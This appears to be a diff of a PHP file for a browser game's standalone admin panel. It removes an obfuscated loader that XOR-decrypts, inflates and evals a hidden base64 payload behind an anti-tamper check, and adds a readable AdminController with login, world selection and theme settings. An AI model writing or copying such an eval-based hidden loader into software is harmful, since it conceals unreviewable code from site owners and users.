@@ -1,24 +1,468 @@
 <?php
-$akjarlq="fdaf248e817902f15b9f0b5bc9bd1bd8";
-$maoombmlzzh="51505856070c0e560d09530001065f5206075f5e07550404510104050557510d";
-$dfodtkwwq="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";
-$xydvmbkzye=file_get_contents(__FILE__);
-$oymjuopvw=str_replace($dfodtkwwq,"",$xydvmbkzye);
-if(strpos($oymjuopvw,"ec"."ho")!==false||strpos($oymjuopvw,"pr"."int")!==false||strpos($oymjuopvw,"var_"."dump")!==false||strpos($oymjuopvw,"file_put_"."contents")!==false||strpos($oymjuopvw,"fw"."rite")!==false){die();}
-$jgynzktwal=str_replace(array($akjarlq,$maoombmlzzh),array("SP_ecfb6fcc","KP_791b78b1"),$xydvmbkzye);
-$athmbvvmzw=md5($jgynzktwal);
-$kdjmngwhmn=hex2bin($maoombmlzzh);
-$zfyzhk="";
-$dxemljf=strlen($athmbvvmzw);
-for($afdlmnrvlb=0;$afdlmnrvlb<$dxemljf;$afdlmnrvlb++){
-    $zfyzhk.=chr(ord($kdjmngwhmn[$afdlmnrvlb])^ord($athmbvvmzw[$afdlmnrvlb]));
+
+namespace App\Controllers;
+
+use App\Core\Database;
+
+/**
+ * AdminController - Standalone Admin Panel Controller
+ * Handles authentication and routing for standalone admin access
+ */
+class AdminController
+{
+    private $db;
+    private $indexDb;
+
+    public function __construct()
+    {
+        // Connect to index database for admin authentication
+        $this->indexDb = Database::getInstance(\App\Core\Database::getGlobalDbName());
+    }
+
+    /**
+     * Display login page for standalone admin panel
+     */
+    public function showLogin()
+    {
+        // Check if already logged in
+        if ($this->isAdminLoggedIn()) {
+            header('Location: admin.php?action=select_world');
+            exit;
+        }
+
+        // Check for login errors
+        $error = $_SESSION['admin_login_error'] ?? null;
+        unset($_SESSION['admin_login_error']);
+
+        require __DIR__ . '/../Views/admin_login.php';
+    }
+
+    /**
+     * Handle admin login
+     */
+    public function login()
+    {
+        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+            header('Location: admin.php');
+            exit;
+        }
+
+        $username = $_POST['username'] ?? '';
+        $password = $_POST['password'] ?? '';
+
+        if (empty($username) || empty($password)) {
+            $_SESSION['admin_login_error'] = __('admin.errors.fill_all_fields');
+            header('Location: admin.php');
+            exit;
+        }
+
+        // Query conta table for admin user
+        $user = $this->indexDb->fetch(
+            "SELECT * FROM conta WHERE nazwa = ? AND activated = '1' AND banned = '0'",
+            [$username]
+        );
+
+        if (!$user) {
+            $_SESSION['admin_login_error'] = __('admin.errors.invalid_credentials');
+            header('Location: admin.php');
+            exit;
+        }
+
+        // Verify password using SecurityHelper
+        $passwordValid = \App\Helpers\SecurityHelper::verifyPassword($password, $user['haslo']);
+
+        if (!$passwordValid) {
+            $_SESSION['admin_login_error'] = __('admin.errors.invalid_credentials');
+            header('Location: admin.php');
+            exit;
+        }
+
+        // Check if it's a legacy hash and rehash it transparently
+        if (substr($user['haslo'], 0, 4) !== '$2y$') {
+            $newHash = \App\Helpers\SecurityHelper::hashPassword($password);
+            $this->indexDb->query("UPDATE conta SET haslo = ? WHERE id = ?", [$newHash, $user['id']]);
+            $user['haslo'] = $newHash;
+        }
+
+        // Check if user has admin privileges
+        if ($user['admin'] != 1) {
+            $_SESSION['admin_login_error'] = __('admin.errors.access_denied');
+            header('Location: admin.php');
+            exit;
+        }
+
+        // Create admin session
+        $_SESSION['admin_id'] = $user['id'];
+        $_SESSION['admin_username'] = $user['nazwa'];
+        $_SESSION['admin_logged_in'] = true;
+        $_SESSION['admin_login_time'] = time();
+
+        // Update session in database
+        $sessionId = session_id();
+        $this->indexDb->query(
+            "UPDATE conta SET session = ? WHERE id = ?",
+            [$sessionId, $user['id']]
+        );
+
+        header('Location: admin.php?action=select_world');
+        exit;
+    }
+
+    /**
+     * Handle admin logout
+     */
+    public function logout()
+    {
+        // Clear session
+        if (isset($_SESSION['admin_id'])) {
+            $this->indexDb->query(
+                "UPDATE conta SET session = '' WHERE id = ?",
+                [$_SESSION['admin_id']]
+            );
+        }
+
+        unset($_SESSION['admin_id']);
+        unset($_SESSION['admin_username']);
+        unset($_SESSION['admin_logged_in']);
+        unset($_SESSION['admin_current_world']);
+
+        header('Location: admin.php');
+        exit;
+    }
+
+    /**
+     * Display world selector
+     */
+    public function selectWorld()
+    {
+        if (!$this->isAdminLoggedIn()) {
+            header('Location: admin.php');
+            exit;
+        }
+
+        // Get list of available worlds
+        $worlds = $this->getAvailableWorlds();
+
+        require __DIR__ . '/../Views/admin_world_selector.php';
+    }
+
+    /**
+     * Switch to a specific world
+     */
+    public function switchWorld()
+    {
+        if (!$this->isAdminLoggedIn()) {
+            header('Location: admin.php');
+            exit;
+        }
+
+        $worldDb = $_GET['world'] ?? '';
+
+        // Validate world exists
+        if (!$this->isValidWorld($worldDb)) {
+            $_SESSION['admin_error'] = __('admin.errors.invalid_world');
+            header('Location: admin.php?action=select_world');
+            exit;
+        }
+
+        // Set current world in session
+        $_SESSION['admin_current_world'] = $worldDb;
+
+        // Redirect to admin dashboard
+        header('Location: admin.php?action=dashboard');
+        exit;
+    }
+
+    /**
+     * Display admin dashboard for current world
+     */
+    public function dashboard()
+    {
+        if (!$this->isAdminLoggedIn()) {
+            header('Location: admin.php');
+            exit;
+        }
+
+        $currentWorld = $_SESSION['admin_current_world'] ?? null;
+
+        if (!$currentWorld) {
+            header('Location: admin.php?action=select_world');
+            exit;
+        }
+
+        // Connect to world database
+        $this->db = \App\Core\Database::getInstance($currentWorld);
+
+        // Use AdminScreen to gather data for all modes
+        $adminScreen = new \App\Controllers\Screens\AdminScreen(
+            ['id' => $_SESSION['admin_id'] ?? 0, 'username' => $_SESSION['admin_username'] ?? '', 'admin' => 1],
+            ['id' => 0],
+            [],
+            $this->db
+        );
+        
+        // Disable header redirects in AdminScreen temporarily or ensure it's bypassed
+        $data = $adminScreen->getData();
+        $data['is_standalone'] = true;
+        // adminBaseUrl logic 
+        $data['adminBaseUrl'] = 'admin.php?action=dashboard';
+
+        // Extract variables to be available in the views
+        extract($data);
+        
+        // Also required by the dashboard layout wrapper:
+        $stats = $this->getWorldStats();
+
+        require __DIR__ . '/../Views/admin_dashboard.php';
+    }
+
+    /**
+     * Display global settings page
+     */
+    public function globalSettings()
+    {
+        if (!$this->isAdminLoggedIn()) {
+            header('Location: admin.php');
+            exit;
+        }
+
+        // Load current config
+        require __DIR__ . '/../../public/configs/config.php';
+        $currentTheme = $conf['index_theme'] ?? 'classic';
+        $currentIngameTheme = $conf['ingame_theme'] ?? 'classic';
+
+        require __DIR__ . '/../Views/admin_global_settings.php';
+    }
+
+    /**
+     * Save global settings to config file
+     */
+    public function saveGlobalSettings()
+    {
+        if (!$this->isAdminLoggedIn() || $_SERVER['REQUEST_METHOD'] !== 'POST') {
+            header('Location: admin.php');
+            exit;
+        }
+
+        $newTheme = $_POST['index_theme'] ?? 'classic';
+        if (!in_array($newTheme, ['classic', 'modern'])) {
+            $newTheme = 'classic';
+        }
+
+        $newIngameTheme = $_POST['ingame_theme'] ?? 'classic';
+        $valid_themes = ['classic'];
+        $css_dir = __DIR__ . '/../../public/css';
+        if (is_dir($css_dir)) {
+            $files = scandir($css_dir);
+            foreach ($files as $file) {
+                if (preg_match('/^game_([a-zA-Z0-9_\-]+)\.css$/', $file, $matches)) {
+                    $code = $matches[1];
+                    $valid_themes[] = $code;
+                }
+            }
+        }
+        if (!in_array($newIngameTheme, $valid_themes)) {
+            $newIngameTheme = 'classic';
+        }
+
+        $configFile = __DIR__ . '/../../public/configs/config.php';
+        $content = file_get_contents($configFile);
+
+        // Simple regex replace for the index_theme setting
+        $pattern = "/\\\$conf\['index_theme'\]\s*=\s*['\"].*?['\"];/";
+        $replacement = "\$conf['index_theme'] = '$newTheme';";
+
+        if (preg_match($pattern, $content)) {
+            $content = preg_replace($pattern, $replacement, $content);
+        } else {
+            // Append if not found (shouldn't happen since we added it)
+            $content = str_replace('?>', "\$conf['index_theme'] = '$newTheme';\n?>", $content);
+        }
+
+        // Simple regex replace for the ingame_theme setting
+        $patternIngame = "/\\\$conf\['ingame_theme'\]\s*=\s*['\"].*?['\"];/";
+        $replacementIngame = "\$conf['ingame_theme'] = '$newIngameTheme';";
+
+        if (preg_match($patternIngame, $content)) {
+            $content = preg_replace($patternIngame, $replacementIngame, $content);
+        } else {
+            // Append right below the index_theme (or before the end tag)
+            if (strpos($content, "\$conf['index_theme'] = '$newTheme';") !== false) {
+                $content = str_replace(
+                    "\$conf['index_theme'] = '$newTheme';",
+                    "\$conf['index_theme'] = '$newTheme';\n\$conf['ingame_theme'] = '$newIngameTheme';",
+                    $content
+                );
+            } else {
+                $content = str_replace('?>', "\$conf['ingame_theme'] = '$newIngameTheme';\n?>", $content);
+            }
+        }
+
+        file_put_contents($configFile, $content);
+        if (function_exists('opcache_invalidate')) {
+            @opcache_invalidate($configFile, true);
+        }
+
+        $_SESSION['admin_success'] = "Configurações guardadas com sucesso!";
+        header('Location: admin.php?action=global_settings');
+        exit;
+    }
+
+    private function isAdminLoggedIn()
+    {
+        return isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true;
+    }
+
+private function getAvailableWorlds()
+{
+    $worlds = [];
+    $worldsDir = __DIR__ . '/../Config/Worlds';
+    
+    if (!is_dir($worldsDir)) {
+        return $worlds;
+    }
+    
+    $files = scandir($worldsDir);
+    
+    foreach ($files as $file) {
+        // Aceita: 1.php, 2.php, classico1.php, etc.
+        if (!preg_match('/^([a-zA-Z]*\d+)\.php$/', $file, $matches)) {
+            continue;
+        }
+        
+        $worldId = $matches[1];
+        $worldConfigPath = $worldsDir . '/' . $file;
+        $worldConfig = include $worldConfigPath;
+        
+        if (!is_array($worldConfig)) {
+            continue;
+        }
+        
+        // Obter credenciais da BD do mundo
+        $dbHost = $worldConfig['db_host'] ?? null;
+        $dbUser = $worldConfig['db_user'] ?? null;
+        $dbPass = $worldConfig['db_pw'] ?? $worldConfig['db_pass'] ?? null;
+        $dbName = $worldConfig['db_name'] ?? null;
+        
+        if (!$dbHost || !$dbName) {
+            continue;
+        }
+        
+        // Nome amigável para exibição
+        if (preg_match('/^([a-zA-Z]+)(\d+)$/', $worldId, $nameMatch)) {
+            $prefix = ucfirst($nameMatch[1]);
+            $number = $nameMatch[2];
+            $displayName = "$prefix $number";
+        } else {
+            $displayName = __('admin.world_selector.world_prefix') . ' ' . $worldId;
+        }
+        
+        $isClosed = isset($worldConfig['is_closed']) && $worldConfig['is_closed'] == true;
+        
+        // Tentar conectar à BD do mundo para obter estatísticas
+        $totalUsers = 0;
+        $totalVillages = 0;
+        $onlineUsers = 0;
+        
+        if (!$isClosed) {
+            try {
+                $worldDb = @\mysqli_connect($dbHost, $dbUser, $dbPass, $dbName);
+                
+                if ($worldDb) {
+                    \mysqli_set_charset($worldDb, 'utf8');
+                    
+                    $result = @\mysqli_query($worldDb, "SELECT COUNT(*) as count FROM users");
+                    if ($result) {
+                        $row = \mysqli_fetch_assoc($result);
+                        $totalUsers = (int)($row['count'] ?? 0);
+                    }
+                    
+                    $result = @\mysqli_query($worldDb, "SELECT COUNT(*) as count FROM villages");
+                    if ($result) {
+                        $row = \mysqli_fetch_assoc($result);
+                        $totalVillages = (int)($row['count'] ?? 0);
+                    }
+                    
+                    $result = @\mysqli_query($worldDb, "SELECT COUNT(*) as count FROM users WHERE last_activity > " . (time() - 300));
+                    if ($result) {
+                        $row = \mysqli_fetch_assoc($result);
+                        $onlineUsers = (int)($row['count'] ?? 0);
+                    }
+                    
+                    \mysqli_close($worldDb);
+                }
+            } catch (\Exception $e) {
+                // Ignorar erros de conexão
+            }
+        }
+        
+        $worlds[] = [
+            'db_name' => $dbName,
+            'world_id' => $worldId,
+            'display_name' => $displayName,
+            'total_users' => $totalUsers,
+            'total_villages' => $totalVillages,
+            'online_users' => $onlineUsers,
+            'is_closed' => $isClosed
+        ];
+    }
+    
+    // Ordenar por número do mundo
+    usort($worlds, function ($a, $b) {
+        preg_match('/\d+/', $a['world_id'], $numA);
+        preg_match('/\d+/', $b['world_id'], $numB);
+        $numA = isset($numA[0]) ? (int)$numA[0] : 0;
+        $numB = isset($numB[0]) ? (int)$numB[0] : 0;
+        return $numA - $numB;
+    });
+    
+    return $worlds;
 }
-$itlfpfwx=base64_decode($dfodtkwwq);
-$twczksjjrqb=strlen($itlfpfwx);
-$wmopasd="";
-$rjgwbkx=strlen($zfyzhk);
-for($afdlmnrvlb=0;$afdlmnrvlb<$twczksjjrqb;$afdlmnrvlb++){
-    $wmopasd.=$itlfpfwx[$afdlmnrvlb]^$zfyzhk[$afdlmnrvlb%$rjgwbkx];
+
+/**
+ * Validate if world database exists
+ */
+private function isValidWorld($worldDb)
+{
+    // Sanitize database name
+    $worldDb = preg_replace('/[^a-zA-Z0-9_]/', '', $worldDb);
+    
+    $worldsDir = __DIR__ . '/../Config/Worlds';
+    
+    if (!is_dir($worldsDir)) {
+        return false;
+    }
+    
+    $files = scandir($worldsDir);
+    
+    foreach ($files as $file) {
+        if (!preg_match('/^([a-zA-Z]*\d+)\.php$/', $file)) {
+            continue;
+        }
+        
+        $worldConfig = include $worldsDir . '/' . $file;
+        
+        if (is_array($worldConfig) && isset($worldConfig['db_name']) && $worldConfig['db_name'] === $worldDb) {
+            return true;
+        }
+    }
+    
+    return false;
 }
-$bisdrflsurn="gz"."in"."fl"."ate";
-eval($bisdrflsurn($wmopasd));
+
+    /**
+     * Get statistics for current world
+     */
+    private function getWorldStats()
+    {
+        return [
+            'total_users' => $this->db->fetch("SELECT COUNT(*) as count FROM users")['count'] ?? 0,
+            'total_villages' => $this->db->fetch("SELECT COUNT(*) as count FROM villages")['count'] ?? 0,
+            'total_allies' => $this->db->fetch("SELECT COUNT(*) as count FROM ally")['count'] ?? 0,
+            'online_users' => $this->db->fetch(
+                "SELECT COUNT(*) as count FROM users WHERE last_activity > ?",
+                [time() - 300]
+            )['count'] ?? 0,
+        ];
+    }
+}
